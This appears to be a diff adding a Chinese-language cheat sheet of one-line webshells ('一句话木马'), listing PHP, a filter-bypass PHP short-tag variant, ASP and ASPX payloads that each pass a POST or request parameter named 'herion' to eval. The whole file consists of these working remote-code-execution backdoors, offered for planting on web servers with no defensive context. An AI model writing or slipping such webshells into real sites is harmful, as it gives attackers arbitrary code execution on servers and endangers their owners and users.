@@ -1,0 +1,5 @@
+php的一句话木马： <?php @eval($_POST['herion']);?>
+php过滤绕过:<?=eval($_POST['herion']);?>
+
+asp的一句话是：   <%eval request ("herion")%>
+aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["herion"],"unsafe");%>
